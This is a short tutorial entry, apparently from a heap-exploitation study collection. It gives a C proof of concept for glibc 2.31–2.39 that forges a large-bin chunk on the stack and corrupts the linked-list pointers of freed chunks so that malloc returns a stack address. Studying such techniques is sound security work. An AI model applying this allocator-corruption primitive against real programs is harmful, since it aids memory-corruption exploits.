<details>
<summary><strong>Description</strong></summary>
<p>

Similar to the unsorted bin linked list, our goal is to allocate a ptr on the stack from malloc. However this time we will be leveraging the large bin. However, the process will be pretty similar...

</p>
</details>

<details>
<summary><strong>POC</strong></summary>
<p>

> compiled with glibc `2.31`, `2.35`, `2.38` and `2.39`

```c
#include <stdio.h>
#include <stdlib.h>

void main() {
    setbuf(stdin, NULL); // disable buffering so _IO_FILE does not interfere with our heap
    setbuf(stdout, NULL);

    long *chunk1, *chunk2, stack_array[140], *chunk3;

    // allocate two big chunks
    chunk1 = malloc(0x420);
    malloc(0x18); // padding chunk to prevent consolidation
    chunk2 = malloc(0x420);
    malloc(0x18); // padding chunk to prevent consolidation

    free(chunk1); // insert them into the unsorted bin
    free(chunk2);

    // malloc a chunk larger than any other unsorted bin chunks to move the three chunks over to the large bin
    malloc(0x420 + 0x10);
    // [largebin 0x400-0x430]: chunk1 -> chunk2

    // create the large bin fake chunk header
    stack_array[0] = 0x000;
    stack_array[1] = 0x431;

    // add a fake heap chunk header, right after the end of our fake large bin bin chunk
    // this is because there are checks for the next adjacent chunk since if malloc properly allocated this (fake) chunk, there would be one there
    stack_array[134] = 0x430;
    stack_array[135] = 0x050;

    // set the fwd/bk pointers of our large bin fake chunk, so that they point to the two chunks were linking to here
    stack_array[2] = ((long)chunk2 - 0x10); // fwd
    stack_array[3] = ((long)chunk1 - 0x10); // bk

    // clear out the fd_nextsize/bk_nexsize of large bin skiplist
    stack_array[4] = 0x00;
    stack_array[5] = 0x00;

    /*VULNERABILITY*/
    chunk1[0] = (long)(stack_array); // fwd
    chunk2[1] = (long)(stack_array); // bk
    /*VULNERABILITY*/
    // [largebin 0x400-0x430]: chunk1 -> fake_chunk -> chunk2

    // allocate our fake large bin chunk that is on the stack
    chunk3 = malloc(0x420);

    printf("chunk3: %p\n", chunk3);
}
```

</p>
</details>

<details>
<summary><strong>Ref</strong></summary>
<p>

- https://github.com/guyinatuxedo/Shogun/blob/main/bin_overviews/large_bins.md
- https://github.com/guyinatuxedo/Shogun/blob/main/pwn_demos/large_bin/linked_list/readme.md
> i modified it a little bit (easier) (but it's worth to read)

</p>
</summary>